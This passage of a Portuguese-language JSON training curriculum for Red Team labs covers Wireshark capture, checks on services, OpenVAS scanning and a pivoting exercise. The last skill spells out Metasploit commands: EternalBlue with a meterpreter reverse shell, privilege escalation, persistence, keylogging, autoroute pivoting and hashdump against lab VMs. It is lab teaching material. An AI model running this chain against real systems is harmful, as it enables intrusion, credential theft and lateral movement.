                                  "verification": "Interface interna listada e captura preliminar mostra tráfego esperado (ex: ARP).",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Wireshark instalado",
                                    "Ambiente lab com rede interna configurada"
                                  ],
                                  "tips": "Use 'ipconfig/ifconfig' no terminal para mapear interfaces antes.",
                                  "learningObjective": "Selecionar corretamente interfaces para monitoramento em redes segmentadas.",
                                  "commonMistakes": [
                                    "Selecionar interface errada capturando tráfego externo",
                                    "Ignorar loopback desnecessariamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Filtros de Captura para Testes de Conectividade",
                                  "subSteps": [
                                    "Criar filtro de captura: 'icmp or tcp.port == 80 or udp' para focar em conectividade básica.",
                                    "Aplicar filtro na interface selecionada via Capture Options.",
                                    "Definir limite de arquivo (ex: 100MB) e rotação automática.",
                                    "Habilitar timestamp preciso e resolução de nomes.",
                                    "Testar filtro com tráfego simulado (ex: ping local)."
                                  ],
                                  "verification": "Filtro aplicado sem erros e captura preliminar filtra apenas tráfego relevante.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Wireshark",
                                    "Documentação de filtros BPF"
                                  ],
                                  "tips": "Use display filters separadamente para análise pós-captura; teste filtros em sandbox.",
                                  "learningObjective": "Dominar filtros BPF para capturas eficientes e focadas.",
                                  "commonMistakes": [
                                    "Filtros sintáticos errados parando captura",
                                    "Sem limite de tamanho causando overflow"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Capturar Tráfego Durante Testes Iniciais de Conectividade",
                                  "subSteps": [
                                    "Iniciar captura na interface com filtros configurados.",
                                    "Executar testes: ping entre hosts internos, telnet/port scans simulados.",
                                    "Monitorar contadores em tempo real para volume de pacotes.",
                                    "Parar captura após 5-10 minutos ou threshold atingido.",
                                    "Salvar arquivo .pcap com nome descritivo (ex: lab_connectivity_test.pcap)."
                                  ],
                                  "verification": "Arquivo .pcap salvo com pelo menos 100 pacotes capturados sem drops.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Hosts lab conectados",
                                    "Ferramentas de teste: ping, nmap básico"
                                  ],
                                  "tips": "Pause captura se tráfego excessivo; use ring buffer para sessões longas.",
                                  "learningObjective": "Executar capturas sincronizadas com testes operacionais.",
                                  "commonMistakes": [
                                    "Captura longa demais gerando arquivos gigantes",
                                    "Não pausar durante análises parciais"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Pacotes e Validar Ausência de Anomalias",
                                  "subSteps": [
                                    "Abrir arquivo .pcap e aplicar display filters (ex: 'ip.src == 192.168.1.0/24').",
                                    "Inspecionar estatísticas: Conversations > IPv4 para fluxos anormais.",
                                    "Verificar por anomalias: retransmissões TCP, pacotes ICMP unexpected, portas não autorizadas.",
                                    "Usar Follow > TCP Stream para reconstruir sessões.",
                                    "Gerar relatório: exportar summary e screenshots de achados."
                                  ],
                                  "verification": "Relatório confirma conectividade normal sem anomalias detectadas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Arquivo .pcap salvo",
                                    "Guia de protocolos TCP/IP"
                                  ],
                                  "tips": "Colorize packets por protocolo para visualização rápida; foque em deltas de RTT altos.",
                                  "learningObjective": "Interpretar capturas para validar integridade de rede interna.",
                                  "commonMistakes": [
                                    "Ignorar baseline tráfego",
                                    "Confundir ruído benigno com anomalias"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, configure uma rede interna 192.168.1.0/24 com 3 VMs. Use Wireshark na interface eth0 para capturar durante pings entre VM1-VM2 e scans de porta leves. Analise para confirmar ausência de broadcasts excessivos ou drops de pacotes, validando conectividade antes de simular ataques.",
                              "finalVerifications": [
                                "Arquivo .pcap salvo sem perdas de pacotes (Statistics > Capture File Properties mostra 0 drops).",
                                "Nenhum fluxo TCP com retransmissões >5% ou RST inesperados.",
                                "ICMP echoes/replies correspondem aos testes executados.",
                                "Sem tráfego de portas não autorizadas (ex: >1024 exceto esperados).",
                                "Estatísticas de throughput estáveis sem picos anômalos.",
                                "Relatório exportado documenta 'Ambiente validado: sem anomalias'."
                              ],
                              "assessmentCriteria": [
                                "Precisão na seleção de interface e filtros (sem tráfego irrelevante capturado).",
                                "Qualidade da análise: identificação correta de protocolos e potenciais issues.",
                                "Eficiência temporal: conclusão dentro de 1.5h totais.",
                                "Documentação completa: relatório com screenshots e métricas.",
                                "Ausência de erros comuns como drops ou configs falhas.",
                                "Demonstração prática de reprodução em peer review."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entendimento profundo de protocolos TCP/IP e Ethernet.",
                                "Análise Forense Digital: Técnicas de captura para investigação de incidentes.",
                                "Segurança de Redes: Integração com IDS/IPS como Snort para monitoramento avançado.",
                                "Programação em Python: Automatização de análises com Scapy ou tshark.",
                                "Gestão de Labs: Integração com virtualização (VirtualBox/VMware) para simulações."
                              ],
                              "realWorldApplication": "Durante operações de Red Team em exercícios de Capture The Flag (CTF) ou pentests, monitorar tráfego interno com Wireshark valida que o ambiente lab não vaza dados para fora, detecta configurações erradas de firewall e confirma isolamento antes de ataques simulados, prevenindo falsos positivos em relatórios de vulnerabilidades."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.5.3",
                        "name": "Validação de Funcionalidade",
                        "description": "Confirmação de que todos os componentes do lab (máquinas, serviços, ferramentas) operam corretamente para suportar exercícios de ethical hacking e simulações de ataque.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.5.3.1",
                            "name": "Verificar inicialização de serviços críticos",
                            "description": "Conferir status de serviços como SSH, HTTP, Active Directory em VMs vítima e atacante usando systemctl, netstat e logs do sistema.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e Acessar as VMs Vítima e Atacante",
                                  "subSteps": [
                                    "Liste as VMs disponíveis no hypervisor (ex: VirtualBox, VMware) usando comandos como 'VBoxManage list vms' ou interface gráfica.",
                                    "Inicie ambas as VMs: vítima e atacante, garantindo que bootem completamente sem erros.",
                                    "Acesse as VMs via console ou SSH inicial se possível, usando credenciais padrão ou configuradas (ex: user: root, pass: toor).",
                                    "Verifique conectividade básica entre host e VMs com ping.",
                                    "Registre IPs das VMs para uso posterior (ex: ifconfig ou ip addr)."
                                  ],
                                  "verification": "Confirme login bem-sucedido em ambas VMs e anote IPs em um log.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Hypervisor com VMs configuradas, terminal SSH, credenciais de acesso.",
                                  "tips": "Use screen ou tmux para sessões persistentes em caso de desconexão.",
                                  "learningObjective": "Garantir acesso seguro e estável às VMs para verificações subsequentes.",
                                  "commonMistakes": "Esquecer de iniciar VMs ou usar credenciais erradas, causando timeouts."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar Status dos Serviços Críticos com Systemctl",
                                  "subSteps": [
                                    "Execute 'systemctl status ssh' (ou sshd) para checar se SSH está active/running.",
                                    "Verifique 'systemctl status apache2' ou 'nginx' para serviço HTTP.",
                                    "Para Active Directory simulado (ex: samba-ad-dc), rode 'systemctl status samba-ad-dc'.",
                                    "Use 'systemctl list-units --type=service --state=running' para listar todos serviços ativos.",
                                    "Reinicie serviços inativos se necessário com 'systemctl restart <serviço>' e verifique novamente."
                                  ],
                                  "verification": "Todos serviços críticos mostram 'active (running)' sem erros recentes.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Acesso root/sudo nas VMs, systemctl disponível (systemd-based Linux).",
                                  "tips": "Filtre com 'systemctl status <serviço> --no-pager' para saída limpa.",
                                  "learningObjective": "Dominar comandos systemctl para monitoramento de serviços essenciais.",
                                  "commonMistakes": "Confundir nomes de serviços (ex: ssh vs sshd) ou não usar sudo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar Portas e Conexões com Netstat",
                                  "subSteps": [
                                    "Instale netstat se ausente: 'apt install net-tools'.",
                                    "Execute 'netstat -tuln | grep :22' para SSH (porta 22).",
                                    "Verifique 'netstat -tuln | grep :80' ou :443 para HTTP.",
                                    "Para AD (porta 389/636 LDAP), use 'netstat -tuln | grep :389'.",
                                    "Cheque conexões ativas: 'netstat -tupn' para processos associados."
                                  ],
                                  "verification": "Portas críticas escutando (LISTEN) nos endereços corretos em ambas VMs.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Net-tools instalado, privilégios para netstat.",
                                  "tips": "Combine com 'ss -tuln' como alternativa moderna ao netstat depreciado.",
                                  "learningObjective": "Identificar exposição de portas de serviços para validação de rede.",
                                  "commonMistakes": "Interpretar incorretamente estados como ESTABLISHED vs LISTEN."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Logs do Sistema para Inicialização",
                                  "subSteps": [
                                    "Acesse logs com 'journalctl -u ssh -xe' para erros recentes no SSH.",
                                    "Verifique 'journalctl -u apache2 -xe' ou nginx para HTTP.",
                                    "Para AD: 'journalctl -u samba-ad-dc -xe'.",
                                    "Use 'tail -f /var/log/syslog' ou 'dmesg | grep error' para problemas de boot.",
                                    "Filtre por tempo: 'journalctl --since \"10 minutes ago\" --no-pager'."
                                  ],
                                  "verification": "Ausência de erros fatais nos logs de inicialização dos serviços.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Journalctl ou /var/log acessível, editor como nano para logs grandes.",
                                  "tips": "Pipe para grep: 'journalctl -u ssh | grep failed' para falhas rápidas.",
                                  "learningObjective": "Usar logs para diagnosticar problemas de inicialização de serviços.",
                                  "commonMistakes": "Ignorar warnings como erros ou sobrecarregar com logs verbosos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentar e Confirmar Funcionalidade em Ambas VMs",
                                  "subSteps": [
                                    "Compile resultados em um relatório: status, portas, logs para vítima e atacante.",
                                    "Teste conectividade: 'ssh user@IP-vitima' e 'curl http://IP-atacante'.",
                                    "Compare configurações entre VMs para consistência.",
                                    "Salve screenshot ou output de comandos como evidência.",
                                    "Reporte discrepâncias e corrija se necessário."
                                  ],
                                  "verification": "Relatório completo confirma todos serviços funcionais em ambas VMs.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Editor de texto, ferramenta de screenshot.",
                                  "tips": "Use Markdown para relatório rápido e legível.",
                                  "learningObjective": "Sintetizar verificações em documentação acionável.",
                                  "commonMistakes": "Pular testes funcionais, focando só em status."
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team, antes de simular um ataque MITM, verifique SSH na VM atacante (netstat mostra porta 22 LISTEN, systemctl active) e HTTP na vítima (curl responde 200 OK, logs sem erros), garantindo que o jogo cibernético prossiga sem falhas de ambiente.",
                              "finalVerifications": [
                                "SSH active e porta 22 escutando em ambas VMs.",
                                "Serviço HTTP rodando sem erros em journalctl.",
                                "Active Directory simulado up e acessível via porta LDAP.",
                                "Nenhum erro crítico em /var/log/syslog ou dmesg.",
                                "Testes de conectividade (ping, ssh, curl) bem-sucedidos.",
                                "Relatório documentado com evidências."
                              ],
                              "assessmentCriteria": [
                                "Precisão na execução de comandos systemctl e netstat (100% dos serviços checados).",
                                "Identificação correta de 3+ serviços críticos com status running.",
                                "Análise completa de logs sem omissões de erros.",
                                "Documentação clara com verificações e testes funcionais.",
                                "Tempo total dentro de 60 minutos com zero falhas operacionais.",
                                "Demonstração de troubleshooting para qualquer discrepância."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Operacionais: Gerenciamento de serviços systemd.",
                                "Redes de Computadores: Análise de portas e sockets com netstat.",
                                "Segurança da Informação: Validação de pré-condições para simulações de ataque.",
                                "Análise Forense: Leitura e interpretação de logs do sistema."
                              ],
                              "realWorldApplication": "Durante resposta a incidentes cibernéticos, profissionais de SOC verificam serviços críticos em servidores comprometidos para restaurar operações, ou em DevOps pipelines para CI/CD, garantindo que ambientes de staging estejam prontos para testes de penetração."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.3.2",
                            "name": "Executar scans de vulnerabilidades iniciais",
                            "description": "Rodar OpenVAS ou Nessus para validar presença de vulnerabilidades conhecidas configuradas intencionalmente no lab para cenários de Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e Configurar o Scanner de Vulnerabilidades",
                                  "subSteps": [
                                    "Verificar se o OpenVAS ou Nessus está instalado no ambiente de lab (ex: Kali Linux para OpenVAS).",
                                    "Atualizar as definições de vulnerabilidades (NVTs no OpenVAS via greenbone-nvt-sync).",
                                    "Configurar credenciais de acesso ao scanner (usuário admin e senha forte).",
                                    "Acessar a interface web do scanner (https://127.0.0.1:9392 para OpenVAS).",
                                    "Criar um usuário de teste para scans não-root."
                                  ],
                                  "verification": "Interface web acessível e feed de vulnerabilidades atualizado sem erros nos logs.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Máquina lab com Kali Linux ou similar",
                                    "OpenVAS/Nessus instalado",
                                    "Acesso root temporário"
                                  ],
                                  "tips": "Use 'sudo gvm-setup' para configuração inicial rápida no OpenVAS; evite scans como root.",
                                  "learningObjective": "Entender a preparação inicial do scanner para scans confiáveis.",
                                  "commonMistakes": [
                                    "Não atualizar feeds, resultando em scans desatualizados",
                                    "Ignorar firewalls locais bloqueando porta 9392",
                                    "Usar credenciais fracas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Alvos e Políticas de Scan",
                                  "subSteps": [
                                    "Identificar IPs ou ranges de alvos no lab (ex: VMs com vulnerabilidades intencionais como 192.168.1.100-110).",
                                    "Criar ou selecionar uma política de scan (Full and Fast para inicial; incluir autenticação se possível).",
                                    "Configurar targets no scanner, adicionando portas comuns (80, 443, 22, etc.).",
                                    "Definir configurações como alive tests (TCP/UDP ping) e timeout para evitar falsos negativos.",
                                    "Salvar e validar a configuração sem iniciar o scan."
                                  ],
                                  "verification": "Target e task configurados visíveis na dashboard sem erros de validação.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Lista de IPs do lab",
                                    "Documentação de vulnerabilidades conhecidas no lab"
                                  ],
                                  "tips": "Comece com scan não-autenticado para validação inicial; use políticas pré-definidas para eficiência.",
                                  "learningObjective": "Configurar scans direcionados para validar vulnerabilidades específicas do lab.",
                                  "commonMistakes": [
                                    "Ranges de IP incorretos levando a scans em hosts errados",
                                    "Políticas muito agressivas derrubando VMs frágeis",
                                    "Esquecer alive tests resultando em 'dead hosts'"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar e Monitorar o Scan Inicial",
                                  "subSteps": [
                                    "Iniciar a task de scan na interface web.",
                                    "Monitorar progresso em tempo real (progress bar, logs de eventos).",
                                    "Ajustar scan se necessário (pausar/resumir se sobrecarga detectada).",
                                    "Registrar tempo de início e estimado de conclusão.",
                                    "Verificar logs para erros durante execução (ex: timeouts, autenticação falha)."
                                  ],
                                  "verification": "Scan completado com status 'Done' e relatório gerado.",
                                  "estimatedTime": "30-60 minutos (dependendo do tamanho)",
                                  "materials": [
                                    "Interface web do scanner ativa",
                                    "Rede lab estável"
                                  ],
                                  "tips": "Execute em horários off-peak do lab; use scans assíncronos para múltiplos targets.",
                                  "learningObjective": "Gerenciar execução de scans de forma eficiente e segura.",
                                  "commonMistakes": [
                                    "Iniciar múltiplos scans simultâneos sobrecarregando recursos",
                                    "Ignorar alertas de erro durante scan",
                                    "Não monitorar, perdendo insights em tempo real"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Resultados Iniciais e Validar Vulnerabilidades",
                                  "subSteps": [
                                    "Acessar relatório gerado e filtrar por severidade (High/Critical).",
                                    "Comparar achados com vulnerabilidades conhecidas configuradas no lab (ex: CVE-2021-XXXX em Apache).",
                                    "Exportar relatório em PDF/XML para documentação.",
                                    "Verificar falsos positivos manualmente (ex: telnet para porta aberta).",
                                    "Documentar validação para relatório de Red Team."
                                  ],
                                  "verification": "Relatório confirma presença de pelo menos 80% das vulnerabilidades intencionais.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Relatório de scan",
                                    "Lista de vulnerabilidades esperadas do lab"
                                  ],
                                  "tips": "Use filtros por CVE para foco; cruze com nmap para confirmação.",
                                  "learningObjective": "Interpretar resultados de scan para validar ambiente Red Team.",
                                  "commonMistakes": [
                                    "Confundir falsos positivos com reais",
                                    "Não documentar para rastreabilidade",
                                    "Ignorar severidades médias que podem ser exploráveis"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com VM Ubuntu vulnerável (Heartbleed CVE-2014-0160), configure target 192.168.1.50 no OpenVAS com política Full and Fast, execute scan, e valide detecção de SSL vuln no relatório High severity.",
                              "finalVerifications": [
                                "Scan completado sem crashes no scanner ou targets.",
                                "Relatório gerado confirma vulnerabilidades conhecidas (ex: 5+ CVEs intencionais).",
                                "Tempo total dentro de 2 horas; documentação salva.",
                                "Nenhum falso negativo em vulnerabilidades configuradas.",
                                "Logs limpos de erros críticos.",
                                "Relatório exportado e compartilhado com equipe Red Team."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração (targets e políticas corretos: 25%)",
                                "Execução sem interrupções (monitoramento eficaz: 20%)",
                                "Análise correta de resultados (validação de 90%+ vulns: 30%)",
                                "Documentação completa e profissional (20%)",
                                "Eficiência temporal e uso de recursos (5%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entender portas e serviços escaneados (Networking basics).",
                                "Sistemas Operacionais: Configuração de VMs vulneráveis (Linux/Windows hardening).",
                                "Programação: Scripts para automação de scans (Bash/Python com GVM API).",
                                "Análise de Dados: Interpretação de relatórios JSON/XML.",
                                "Ética em Cibersegurança: Consentimento para scans em labs controlados."
                              ],
                              "realWorldApplication": "Em operações Red Team reais, scans iniciais com Nessus/OpenVAS validam alvos corporativos para priorizar exploits, simulando reconnaissance phase em pentests autorizados, garantindo que vulns conhecidas sejam exploráveis antes de ataques simulados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.5.3.3",
                            "name": "Simular ataque básico de pivoting",
                            "description": "Testar chain de ataques simples (ex: Metasploit para exploit -> meterpreter -> pivot) para garantir funcionalidade de ferramentas de ethical hacking.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de laboratório isolado",
                                  "subSteps": [
                                    "Inicie as máquinas virtuais: Attacker (Kali Linux em 192.168.56.101), Victim1 (Windows 7 vulnerável em 192.168.56.102) e Victim2 (Windows em 10.0.0.5 atrás de firewall).",
                                    "Verifique conectividade: ping entre Attacker e Victim1; confirme que Victim2 não é acessível diretamente de Attacker.",
                                    "Atualize e inicie Metasploit no Attacker: msfupdate && msfconsole.",
                                    "Configure firewall em Victim1 para permitir tráfego SMB (porta 445).",
                                    "Teste vulnerabilidade em Victim1: use nmap -p445 --script smb-vuln-ms17-010 192.168.56.102."
                                  ],
                                  "verification": "Ambiente pronto se ping funciona para Victim1, nmap confirma vulnerabilidade e Victim2 inacessível.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VMware/VirtualBox",
                                    "Kali Linux ISO",
                                    "Windows 7 vulnerable image",
                                    "Metasploit Framework"
                                  ],
                                  "tips": "Use rede host-only para isolamento total; snapshot VMs antes de começar.",
                                  "learningObjective": "Preparar um lab seguro e funcional para simulações de ataques em chain.",
                                  "commonMistakes": [
                                    "Não isolar rede (risco de escape)",
                                    "IPs incorretos",
                                    "Metasploit não atualizado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Lançar exploit inicial no host alvo (Victim1)",
                                  "subSteps": [
                                    "No msfconsole, busque exploit: search ms17_010.",
                                    "Use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.56.102; set LHOST 192.168.56.101; set payload windows/meterpreter/reverse_tcp.",
                                    "Configure handler: exploit -j (em background).",
                                    "Monitore jobs: jobs -l; confirme handler escutando na porta 4444.",
                                    "Aguarde trigger: interaja com Victim1 via SMB ou reinicie serviço."
                                  ],
                                  "verification": "Sessão meterpreter aberta: sessions -l mostra sessão ativa.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Metasploit console",
                                    "Victim1 vulnerável"
                                  ],
                                  "tips": "Use payloads reverse para NAT/firewalls; teste payload com set VerifyArch false se erro.",
                                  "learningObjective": "Dominar configuração de exploits básicos no Metasploit para foothold inicial.",
                                  "commonMistakes": [
                                    "Payload incompatível com arquitetura",
                                    "Porta handler em conflito",
                                    "RHOSTS errado"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer e estabilizar sessão Meterpreter em Victim1",
                                  "subSteps": [
                                    "Interaja com sessão: sessions -i 1.",
                                    "Eleve privilégios: getsystem ou use post/multi/manage/shell_to_meterpreter.",
                                    "Colete info: sysinfo, getuid, ipconfig; note IP interno 10.0.0.4 de Victim1.",
                                    "Persistência básica: run persistence -U -i 10 -p 4444 -r 192.168.56.101.",
                                    "Teste estabilidade: background sessão e reconecte."
                                  ],
                                  "verification": "Meterpreter com SYSTEM privileges e IP interno visível.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Sessão Meterpreter ativa"
                                  ],
                                  "tips": "Sempre eleve privs antes de pivot; use keyscan_start para credenciais extras.",
                                  "learningObjective": "Manter acesso estável pós-exploit para chains avançadas.",
                                  "commonMistakes": [
                                    "Não elevar privilégios (pivot falha)",
                                    "Ignorar rede interna",
                                    "Sessão instável por falta de persistência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar pivot via Meterpreter para rede interna",
                                  "subSteps": [
                                    "Na sessão Meterpreter: run autoroute -s 10.0.0.0/255.255.255.0.",
                                    "Verifique rotas: route; confirme adição da sub-rede 10.0.0.0/24 via sessão.",
                                    "Alternativa: portfwd add -l 8080 -p 80 -r 10.0.0.5 (para forwarding específico).",
                                    "Teste conectividade: ping 10.0.0.5 do Meterpreter.",
                                    "Background sessão e verifique no msfconsole: route add 10.0.0.0/24 1."
                                  ],
                                  "verification": "Routes listadas incluem sub-rede interna via sessão pivot.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Meterpreter em Victim1",
                                    "Conhecimento de IPs internos"
                                  ],
                                  "tips": "Autoroute é automático para post-exploitation; use socks proxy para apps externos.",
                                  "learningObjective": "Implementar pivoting para expandir alcance em redes segmentadas.",
                                  "commonMistakes": [
                                    "Máscara de sub-rede errada",
                                    "Sessão background sem route",
                                    "Firewall bloqueando ICMP"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar pivô explorando Victim2 e cleanup",
                                  "subSteps": [
                                    "No msfconsole, use auxiliary/scanner/portscan/tcp target 10.0.0.5; confirme portas abertas.",
                                    "Exploit em Victim2 via pivot: use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.0.0.5.",
                                    "Execute e obtenha nova sessão meterpreter em Victim2.",
                                    "Documente chain: screenshot ou hashdump em ambos hosts.",
                                    "Cleanup: kill persistence, sessions -K, delete VMs snapshots."
                                  ],
                                  "verification": "Sessão meterpreter bem-sucedida em Victim2 via pivot.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Rotas pivot ativas",
                                    "Victim2 vulnerável"
                                  ],
                                  "tips": "Sempre documente para relatórios Red Team; teste com nmap via proxychains se SOCKS.",
                                  "learningObjective": "Confirmar chain completo e práticas de cleanup seguras.",
                                  "commonMistakes": [
                                    "Exploit sem route ativa",
                                    "Sem cleanup (detecção)",
                                    "Documentação incompleta"
                                  ]
                                }
                              ],
                              "practicalExample": "Lab: Kali (192.168.56.101) → ms17_010 em Victim1 (192.168.56.102/10.0.0.4) → autoroute 10.0.0.0/24 → scan/exploit Victim2 (10.0.0.5). Resultado: shell em Victim2 sem acesso direto.",
                              "finalVerifications": [
                                "Sessão Meterpreter em Victim1 com SYSTEM e rede interna visível.",
                                "Autoroute adiciona sub-rede 10.0.0.0/24 via sessão 1.",
                                "Nmap/portscan succeeds em Victim2 via pivot.",
                                "Nova sessão Meterpreter estabelecida em Victim2.",
                                "Chain documentada com screenshots de sysinfo/ipconfig.",
                                "Cleanup completo: sem persistência ou sessões ativas."
                              ],
                              "assessmentCriteria": [
                                "Execução do chain sem erros de configuração (100% sucesso).",
                                "Tempo total <90 minutos com explicação de comandos usados.",
                                "Compreensão demonstrada: explique diferenças entre autoroute e portfwd.",
                                "Segurança: lab isolado, cleanup total.",
                                "Documentação: log de comandos e outputs salvos.",
                                "Adaptabilidade: ajuste se Victim2 usa porta diferente."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de routing, subnets e firewalls (EN-03).",
                                "Sistemas Operacionais: Exploits Windows SMB (SO-04).",
                                "Programação: Scripts Metasploit resource (PG-02).",
                                "Ética e Direito: Regras de engajamento Red Team (ET-01).",
                                "Análise de Dados: Logs Wireshark do tráfego pivot (AD-03)."
                              ],
                              "realWorldApplication": "Em operações Red Team/pentests reais, pivoting permite comprometer redes internas a partir de um foothold inicial, simulando atacantes APT que lateralizam em DMZs ou segmentos corporativos para acesso a ativos críticos."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            ],
            "totalSkills": 328
          }
        ],
        "totalSkills": 328,
        "percentage": 0
      }
    ]
  }
}